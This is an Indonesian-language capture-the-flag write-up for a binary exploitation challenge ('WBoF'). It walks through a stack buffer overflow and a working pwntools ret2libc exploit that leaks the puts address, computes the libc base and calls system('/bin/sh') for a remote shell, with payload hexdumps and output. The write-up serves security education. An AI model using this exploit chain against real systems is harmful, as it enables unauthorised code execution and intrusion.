# WBoF (25 Points)
"There is always a first time, for everything"
<br>
bruhh, first time in real binex am i right ?<br>
exploit this binary & get the f*cking flag!!!
<br>
nc ctf.serangkota.go.id 9980
<br>
Pembuat Soal: n00bsj3rk
# Solved
<b>Kesimpulan : Points challenge ini tidak setara dengan challenge yang lain, apalgi untuk pemula yang menganggap nya susah. Jadi untuk admin ctf-serang-kota agar dinaikkan :D</b><br>
Mari kita cek source pada aplikasi tersebut
```cpp
int __cdecl read_int()
{
  char c[16]; // [rsp+0h] [rbp-10h]

  read(0, c, 0x10uLL);
  return atoi(c);
}
void __cdecl read_str(int n, char *str)
{
  str[(int)read(0, str, n)] = 0;
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+Ch] [rbp-14h]
  int num; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  init();
  printf("whut time is now ? ", argv);
  num = read_int();
  for ( i = 0; i < num; ++i )
  {
    if ( i & 1 )
      printf("tik.");
    else
      printf("tok.");
  }
  read_str(num, buf);
  puts("wibu wbuf wb0f~");
  return 0;
}
```
Disini saya dapat menyimpulkan bahwa, kita disuruh menggunakan Teknik Bufferoverflow. Pada inputan pertama adalah maximal payload yang akan kita input, disini kita bebas mau isi berapa! Kalo saya hanya sekedar <b>160</b>
```
whut time is now ? 160
tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik.tok.tik
```
Setelah menginput <b>Max size payload</b>, sekarang kita disuruh untuk menginput payload nya. Disini saya mencoba membuat bufferoverflow sebanyak <b>28</b> dan inilah hasilnya
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAA
wibu wbuf wb0f~

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x4012d0 --> 0x8d4c5741fa1e0ff3
RCX: 0xfffffffffffff276
RDX: 0x0
RSI: 0x7fffff78c723 --> 0x78e4c0000000000a
RDI: 0x7fffff78e4c0 --> 0x0
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffffffedb90
RIP: 0x7fffff5c000a --> 0x800000000001e
R8 : 0x10
R9 : 0x4
R10: 0xfffffffffffff276
R11: 0xfffffffffffff276
R12: 0x401080 --> 0x8949ed31fa1e0ff3
R13: 0x7ffffffedc70
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
```
Kita bisa lihat disini, bahwa size untuk bufferflow adalah <b>28</b>, jadi saya note dulu di python script
```python
# Overflow Offset
BUFF_SIZE = 28
SIZE_TOOV = 160
```
Saya disini tidak melihat cara untuk mendapatkan flag, dan seketika saya baca hints nya lagi
```
Stack BoF is lame r8 ?
return to win is not exist bruhh, use libc.so to return :)
```
Disini kita harus melakukan exploit yang bernama <b>ROP (Return Oriented Programming)</b> dan melakukan arahan untuk fungsi yang ada di <b>libc.so</b>. Ini adalah code saya sebelum melakukan <b>ROP</b>. Pastikan kita testing pada localserver kita
```python
wbof = ELF("./wbof")
libc = ELF("./libc.so")

p = wbof.process()

p.recvuntil("whut time is now ? ")
log.info("Sending buffer " + str(SIZE_TOOV))
p.sendline(str(SIZE_TOOV))
```
Oiya jangan lupa untuk set arsiktektur program yaa!
```python
context.arch = "amd64"
```
Setelah menentukan Max Buffernya, sekarang kita harus mengatur payload. Sebelumnya kita harus mencari tau dimana address dari <b>puts</b> yang berada pada stack <b>wbof</b>. Code ini lah yang saya gunakan
```python
# Membuat ROP (Return Oriented Progamming)
rop = ROP(wbof)
rop.call(wbof.symbols[b'puts'], [wbof.got[b'puts']])
rop.call(wbof.symbols[b'_start'])
# Fungsi ROP yang saya terapkan adalah untuk mengambil address puts untuk digunakan sebagai Base-Address pada libc
```
Kemudian, saya jadikan 1 payload nya dngn bufferoverflow
```python
    b"A" * BUFF_SIZE,
    rop.chain()
]

# Send Payload
payload = b"".join(payload)
p.sendline(payload)

log.success("Payload : " + str(payload))
log.success("Payload Size : " + str(len(payload)))
log.success(hexdump(payload))
```
```
[*] Loaded cached gadgets for './wbof'
[+] Payload : b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA3\x13@\x00\x00\x00\x00\x00\x18@@\x00\x00\x00\x00\x000\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00\x00kaaalaaa'
[+] Payload Size : 76
[+] 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  33 13 40 00  │AAAA│AAAA│AAAA│3·@·│
    00000020  00 00 00 00  18 40 40 00  00 00 00 00  30 10 40 00  │····│·@@·│····│0·@·│
    00000030  00 00 00 00  1a 10 40 00  00 00 00 00  80 10 40 00  │····│··@·│····│··@·│
    00000040  00 00 00 00  6b 61 61 61  6c 61 61 61               │····│kaaa│laaa││
    0000004c
```
Fungsi yang saya gunakan pada ROP
```python
rop.call(wbof.symbols[b'_start'])
```
Adalah untuk me-restart instruksi pada program agar dapat melakukan bufferoverflow dan menjalankan fungsi dari <b>libc.so</b>. Setelah saya melakukan instruksi ulang, disini saya melakukan <b>determined</b> antara <b>libc.so</b> address dengan <b>wobf</b> address
```python
# Mengambil Address dari puts pada wbof
puts = p.recvuntil("wb0f~\n").rstrip()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.success(f"Puts address : {hex(puts)}")

libc.address = puts - libc.symbols[b'puts']
log.info(f"libc base address determined {hex(libc.address)}")
```
```
[+] Puts address : 0x7fb0d06365a0
[*] libc base address determined 0x7fb0d05af000
```
Dikarenakan instruksi <b>_start</b> di panggil lagi, kita harus menginput kembali <b>Max Buffer</b> nya
```python
p.recvuntil("whut time is now ? ")
log.info("Sending buffer " + str(SIZE_TOOV))
p.sendline(str(SIZE_TOOV))
```
Disini saya harus mencari address dari <b>wbof</b> untuk menentukan lokasi <b>return / ret</b>, biasanya orang menggunakan <b>ROPgadget</b> untuk mencari tau lokasinya
```python
RET = (rop.find_gadget(['ret']))[0]
# Hasilnya sama dengan
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
```
Dan ada beberapa fungsi code yang tidak bisa saya jelaskan tapi saya memahami nya :v
```python
BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym[b"system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("ret %s " % hex(RET))
log.info("pop rdi %s " % hex(RET))

# Menggabungkan menjadi 1 payload
rop2 = (b"A" * 28) + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

# Send Payload
payload = rop2
p.sendline(payload)

log.success("Payload : " + str(payload))
log.success("Payload Size : " + str(len(payload)))
log.success(hexdump(payload))
puts = p.recvuntil("\n")

p.interactive()
```
Jalankan scriptnya
```
[*] '/home/rasyidmf/CTF-Unsolved/WBoF (Binary Exploitation)/wbof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] '/home/rasyidmf/CTF-Unsolved/WBoF (Binary Exploitation)/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.serangkota.go.id on port 9980: Done
[*] Sending buffer 160
[*] Loaded cached gadgets for './wbof'
[+] Payload : b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA3\x13@\x00\x00\x00\x00\x00\x18@@\x00\x00\x00\x00\x000\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00\x00kaaalaaa'
[+] Payload Size : 76
[+] 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  33 13 40 00  │AAAA│AAAA│AAAA│3·@·│
    00000020  00 00 00 00  18 40 40 00  00 00 00 00  30 10 40 00  │····│·@@·│····│0·@·│
    00000030  00 00 00 00  1a 10 40 00  00 00 00 00  80 10 40 00  │····│··@·│····│··@·│
    00000040  00 00 00 00  6b 61 61 61  6c 61 61 61               │····│kaaa│laaa││
    0000004c
[+] Puts address : 0x7f15407f15a0
[*] Sending buffer 160
[*] libc base address determined 0x7f154076a000
[*] bin/sh 0x7f15409215aa
[*] system 0x7f15407bf410
[*] ret 0x40101a
[*] pop rdi 0x40101a
[+] Payload : b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x003\x13@\x00\x00\x00\x00\x00\xaa\x15\x92@\x15\x7f\x00\x00\x10\xf4{@\x15\x7f\x00\x00'
[+] Payload Size : 60
[+] 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  1a 10 40 00  │AAAA│AAAA│AAAA│··@·│
    00000020  00 00 00 00  33 13 40 00  00 00 00 00  aa 15 92 40  │····│3·@·│····│···@│
    00000030  15 7f 00 00  10 f4 7b 40  15 7f 00 00               │····│··{@│····││
    0000003c
[*] Switching to interactive mode
$
```
Setelah masuk dalam interactive, disitu anda dapat menggunakan bash-script seperti <b>cat / dir / ls</b> untuk mendapatkan flag
```
$ dir
flag  wbof
$ cat flag
DiskoCTF{Warmup_scr1pting_BoF_dulu_guyss...}
```
Flag : <b>DiskoCTF{Warmup_scr1pting_BoF_dulu_guyss...}</b>
